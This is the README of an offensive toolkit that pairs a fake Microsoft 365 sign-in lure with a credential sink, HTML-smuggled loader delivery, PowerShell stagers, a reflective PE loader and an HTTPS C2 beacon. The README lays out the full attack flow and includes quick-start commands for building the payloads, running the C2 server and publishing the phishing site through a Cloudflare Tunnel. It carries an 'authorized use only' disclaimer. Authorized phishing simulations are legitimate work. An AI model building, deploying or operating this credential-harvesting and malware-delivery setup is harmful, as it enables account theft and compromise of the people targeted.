# umbra-microsoft-lure

Microsoft 365 sign-in lure and credential-capture delivery module for
[umbra](https://github.com/nullbyter19/umbra). It reuses the same indirect-syscall
engine and HTTPS C2, and adds a two-step "Microsoft sign-in" page that captures
the credentials typed into it before handing over the disguised loader.

> **Authorized use only.** This project exists for authorized phishing simulations
> and red-team engagements. Running a credential-capture page against users who
> have not consented is illegal in most jurisdictions. You are solely responsible
> for how you use it.

## How the flow works

```text
target  ->  https://c2.example.com/              Microsoft sign-in lure
            POST /updates/v2/auth                credentials -> dist/c2data/creds.jsonl
            "Sign in" gesture                    downloads the embedded loader
loader  ->  https://c2.example.com/updates/v2/sync   AES-256-GCM beacon check-in
```

- **Lure page**: `delivery/ms_login.html` (fallback) or the self-contained
  page generated by `scripts/make_ms_smuggle.py`, which embeds the loader in the
  HTML and only assembles it after the sign-in gesture.
- **Credential sink**: `POST /updates/v2/auth` appends the captured fields to
  `<certdir>/creds.jsonl`. No credential is ever sent anywhere else.
- **C2**: the same server, protocol and passphrase scheme as umbra.

## Components

| Path | Description |
| --- | --- |
| `engine.go`, `resolver_*`, `syscall_*`, `execute_*` | indirect syscall engine (shared with umbra) |
| `c2/proto` | AES-256-GCM message envelope |
| `cmd/server` | C2 server with the credential sink and operator console |
| `cmd/beacon` | implant that checks in over HTTPS |
| `cmd/pack` | beacon configuration packer |
| `delivery/ms_login.html` | two-step Microsoft sign-in lure (fallback) |
| `delivery/stage.ps1`, `delivery/reflect.ps1` | stagers and reflective PE loader |
| `scripts/build.sh` | packs the config, builds the loader and stages `dist/` |
| `scripts/make_ms_smuggle.py` | builds the self-contained evasive landing page |
| `scripts/cf_tunnel.sh` | publishes the origin through a Cloudflare Tunnel |
| `scripts/verify.sh` | checks the public edge (`curl --resolve`) |

## Quick start (Kali)

```bash
# 1. configure the session once
cp scripts/umbra.env.example scripts/umbra.env
$EDITOR scripts/umbra.env          # DOMAIN, HTTP_PORT, C2_PORT, C2_PASS

# 2. build the beacon, the loader and the delivery site
SERVER="https://c2.example.com/updates/v2/sync" \
PASS="change-me-passphrase" \
bash scripts/build.sh

# 3. serve the site (loopback only) and start the C2
bash scripts/serve.sh
./dist/server -listen 127.0.0.1:8443 -pass "change-me-passphrase" -certdir dist/c2data

# 4. publish through the tunnel
DOMAIN="c2.example.com" bash scripts/cf_tunnel.sh

# 5. verify the public edge
bash scripts/verify.sh
```

The full runbook — prerequisites, tunnel configuration, credential handling,
troubleshooting and the detection notes — is in
[docs/README.md](docs/README.md).

## Requirements

- Go 1.21+ (no external dependencies)
- Python 3.8+ (`scripts/*.py`)
- `cloudflared` for the tunnel (`scripts/cf_tunnel.sh` installs it if missing)
- A domain whose zone is hosted on Cloudflare

## Credential handling

Captured credentials are written to `<certdir>/creds.jsonl`, one JSON object per
line. Keep that file out of version control (it is gitignored), restrict access
to it, and delete it at the end of the engagement. Never use real user
credentials outside an authorized simulation.
